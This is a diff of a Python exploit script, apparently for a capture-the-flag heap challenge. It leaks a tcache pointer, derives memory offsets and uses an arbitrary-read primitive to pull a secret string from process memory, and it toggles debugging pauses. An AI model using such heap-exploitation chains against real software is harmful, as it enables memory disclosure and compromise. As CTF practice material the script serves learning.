@@ -112,7 +112,7 @@ offset4 = 0x41a3c0 # from second leak to final 0x41a3c0 0xe1a3c0 0x416800 0xe168
 
 if leak:
 	print("tcache next pointer: ", hex(leak))
-	#print(f"\nGDB: gdb -p {p.pid}")
+	print(f"\nGDB: gdb -p {p.pid}")
 	
 	print(p64(leak)[0:1])
 	if (p64(leak)[0:1] != b'\x00'):
@@ -121,7 +121,7 @@ if leak:
 		print(hex(leak))
 		
 	print(hex((leak << 12) + offset1))
-	#pause()
+	pause()
 	
 	
 	leak2 = arbitrary_read(r1, r2, (leak << 12) + offset1, leak)
@@ -136,10 +136,10 @@ if leak:
 	
 	secret_location = leak2 - offset4
 	print("Secret location: ", hex(secret_location))
-	print(f"\nGDB: gdb -p {p.pid}")
-	pause()
+	#print(f"\nGDB: gdb -p {p.pid}")
+	#pause()
 	
-	secret = arbitrary_read(r1, r2, secret_location, leak)
+	secret = arbitrary_read(r1, r2, secret_location, leak + 1)
 	secret = secret.to_bytes(8, 'little')
 	print(f"Secret string: {secret}")
 
